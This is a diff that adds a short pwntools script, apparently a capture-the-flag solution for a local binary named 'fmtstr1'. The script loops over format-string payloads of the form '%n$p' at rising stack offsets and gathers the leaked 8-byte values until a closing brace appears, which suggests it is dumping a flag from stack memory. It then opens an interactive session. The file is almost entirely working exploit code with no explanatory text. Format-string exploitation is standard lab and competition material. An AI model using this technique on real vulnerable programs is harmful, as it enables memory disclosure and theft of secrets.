@@ -1,0 +1,15 @@
+from pwn import *
+
+res = b"" 
+n = 12
+while(True):
+    p = process("./fmtstr1")
+    payload = f"%{n}$p".encode()
+    p.sendafter(b"string: ", payload)
+    res += p64(int(p.recv(0x12), 16))
+    if(b'}' in res):
+        break
+    n += 1
+
+print(res)
+p.interactive()
